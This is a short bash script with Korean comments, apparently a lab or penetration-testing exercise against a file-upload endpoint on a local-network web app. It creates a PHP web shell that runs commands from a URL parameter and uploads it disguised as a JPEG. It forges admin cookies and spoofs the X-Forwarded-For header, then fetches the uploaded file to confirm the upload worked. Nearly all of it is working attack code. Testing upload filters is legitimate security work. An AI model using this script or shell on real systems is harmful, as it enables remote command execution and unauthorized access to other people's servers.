#!/bin/bash
# 파일 업로드 취약점 테스트 스크립트
# 사용법: ./file-upload.sh [file_path]

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"

echo "[*] 파일 업로드 취약점 테스트"
echo "[*] 타겟: $TARGET/profile/upload"
echo ""

# 테스트용 PHP 웹쉘 생성
SHELL_FILE="/tmp/test-shell.php"
echo '<?php echo "Vulnerable!"; system($_GET["cmd"]); ?>' > "$SHELL_FILE"

echo "[1] PHP 웹쉘 업로드 시도..."
UPLOAD_RESULT=$(curl -s -X POST \
    -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
    -F "profile_image=@$SHELL_FILE;type=image/jpeg" \
    "$TARGET/profile/upload")

echo "[2] 업로드된 파일 확인..."
PROFILE=$(curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
    "$TARGET/profile")

UPLOADED_PATH=$(echo "$PROFILE" | grep -oP 'src="/uploads/[^"]+' | sed 's/src="//')

if [ -n "$UPLOADED_PATH" ]; then
    echo "[+] 업로드 성공: $UPLOADED_PATH"
    echo ""
    echo "[3] 업로드된 파일 내용 확인..."
    CONTENT=$(curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET$UPLOADED_PATH")
    echo "$CONTENT"

    if echo "$CONTENT" | grep -q "system"; then
        echo ""
        echo "[+] 위험! 악성 파일이 필터링 없이 업로드되었습니다."
    fi
else
    echo "[-] 업로드 경로를 찾을 수 없습니다."
fi

# 정리
rm -f "$SHELL_FILE"
